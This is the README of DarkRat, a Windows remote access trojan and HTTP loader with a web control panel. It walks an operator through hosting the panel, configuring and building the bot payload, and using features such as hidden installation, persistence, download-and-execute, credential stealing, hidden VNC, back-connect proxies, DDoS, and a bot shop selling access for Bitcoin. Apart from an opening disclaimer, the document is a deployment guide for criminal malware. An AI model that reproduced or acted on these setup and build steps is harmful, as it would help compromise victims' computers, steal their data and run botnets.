# DarkRat



DarkRAT is one of many remote access tools (RATs) used to control connected computers remotely. Unfortunately, in many cases, cyber criminals trick people into installing RATs onto their systems and then use them to steal personal details, infect systems with malware, and cause other damage.

> Darkrat is designed as a HTTP loader, it is coded in C++ with no dependency, the Current bot is design for the Windows API! this means, DarkRat has no Cross Platform Support.



## Getting Started 
Connect to your Server via `SSH` Install Apache2, PHP7.x MYSQL (MariaDB Server in Ubuntu 18) and PHPMYADMIN
Enable .htaccess from apache2 configurations. Create .htaccess file in your root directory and write inside:

```
<Directory /var/www/html>
  Options FollowSymLinks
  AllowOverride all
  Require all granted
</Directory>
```

Unpack the `DarkRat.zip`
Upload Files to the root of your www (By Default `/var/www/html/`)
on a new Installation delete the `index.html`
Give www Write/Read/Execute permission on all uploaded files (`chmod 777 ./*`)
open your domain oder serverip / Now you see the install page
Flowing the Setup and install the Panel, or install it Manual by import the sql
by default enter username: `admin` password: `admin`

Config Example:
```php 
<?php $pdo = new PDO('mysql:host=localhost;dbname=darkrat', 'username', 'password');
```

## Build a Bot
Create a License file named `darkrat.lic` and enter your License Key.
Create a file named `config.json` and enter your Gate Settings. Shortnames: `ek = Encryption Key (Lenght 32)` and `pu = Pastebin URL OR Direct Encrypted URL`
```json
{
  "pu": "keRwrh9WFcNrWnCLM96VuBRRMCYg/UPgRTb09A=="
}
```

 - mux    ⟶ A Random Mutex
 - sup    ⟶ Startup true/false
 - ri     ⟶ Request Interval in secounds
 - pre    ⟶ Running Persistence true/false
 - st     ⟶ Spread Tag
 - ua     ⟶ User Agent for Post Requests
 - pn     ⟶ Some Example for DarkRat Developers

Full Config Example

```json
{
  "ek": "randomkey",
  "pu": "http://XXX.com/raw/random",
  "mux": "3mCUq1z",
  "sup": "false",
  "ri": "5",
  "pre": "false",
  "st": "main",
  "ua": "SUq1rx",
  "pn": { "FOO":"BAR" }
}
```

Open the builder.exe and enter your username
Select create from Config File if you created one, if not select create from Terminal.
Finished. spider.exe is created, Backtest your payload on a VM.

## Panel

 - Template System based on Smarty
 - Dynamic URL Routing
 - Multi User Support
 - Plugin System
 - Statistics of Bots & online rates
 - Advanced Bot Informations
 - Task Tracking
 - Task Geo Targeting System
 - Task Software Targeting System (for .net software)

## Bot 2.1.3

 - Running Persistence
 - Startup Persistence
 - Installed hidden on the FileSystem
 - Download & Execute
 - Update
 - Uninstall
 - Custom DLL Loading
 - Direct Connect or RAW forwarder (Like pastebin/gist also supported own plain/raw sites)


## Included Plugins

 - Botshop with autobuy Bitcoin API
 - Alpha version of a DDOS
 - HVNC
 - Stealer
 - BackConnect


## Password: passwd
